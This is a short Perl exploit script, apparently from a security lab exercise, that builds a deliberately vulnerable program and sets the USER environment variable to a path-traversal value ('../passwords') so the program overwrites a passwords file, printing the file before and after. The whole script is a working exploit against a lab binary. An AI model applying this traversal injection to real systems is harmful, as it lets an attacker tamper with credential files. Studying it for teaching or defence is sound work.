#!/usr/bin/perl

#Issue 1: Exploit c
#Aim: To modify another file in a file system.

#To compile account_bad.c
system("gcc -g -o /vulnerable/account_bad /vulnerable/account_bad.c");

#Users in passwords file.
$ENV{USER} = 'root';
system("/vulnerable/account_bad rootPassword");
$ENV{USER} = 'hacker';
system("/vulnerable/account_bad hackerPassword");

#verify passwords file content before exploited.
print "#Below is content of passwords file\n";
system("cat /vulnerable/passwords"); 

#Modifying passwords file.
$ENV{USER} = '../passwords';
system("/vulnerable/account_bad otherHackerPassword");

#content of passwords file after exploit.
print "#Below is content of passwords file AFTER exploit\n";
system("cat /vulnerable/passwords"); 
